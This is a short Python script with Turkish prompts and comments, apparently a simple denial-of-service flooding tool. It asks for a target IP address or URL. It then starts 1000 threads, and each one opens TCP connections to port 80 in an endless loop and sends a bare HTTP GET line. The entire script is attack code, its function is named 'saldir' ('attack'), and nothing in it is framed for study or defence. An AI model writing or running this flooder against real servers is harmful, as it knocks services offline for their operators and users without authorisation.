import socket
import threading

target = input("Hedef IP adresini veya URL'sini girin: ")
port = 80

def saldir():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.close()

for i in range(1000): # 1000 farklı bağlantı oluştur
    thread = threading.Thread(target=saldir)
    thread.start()
